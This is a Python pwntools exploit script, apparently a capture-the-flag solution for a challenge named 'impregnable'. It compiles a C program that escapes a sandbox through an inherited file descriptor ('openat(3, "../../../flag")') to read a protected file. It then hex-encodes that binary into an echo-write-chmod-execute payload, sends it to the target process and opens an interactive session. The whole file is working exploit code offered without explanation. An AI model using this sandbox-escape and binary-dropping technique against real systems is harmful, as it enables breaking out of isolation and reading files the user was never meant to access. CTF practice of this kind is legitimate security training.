#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
import os
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))

# io = remote("grjt.game.redbud.info",20003)
io = process('./impregnable')
code = '''
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
int main(){
	char buf[100]={};
	int fd1 = openat(3,"../../../flag",0);
	read(fd1,buf,100);
	write(1,buf,100);
	printf("[+] from server\\n");
}
'''

a = open('hello.c','w')
a.write(code)
a.close()
os.system("gcc hello.c -o hello")
b = open("./hello").read().encode("hex")

c = ""
for i in range(0,len(b),2):
	c += '\\x'+b[i]+b[i+1]
payload = 'echo -e "'+c+'"'+' > exp;chmod +x exp; ./exp'
print "[+] length: " + hex(len(payload))

io.recv()
io.sendline("aaaa")
io.recv()
io.sendline(payload)
io.recv()
io.interactive()
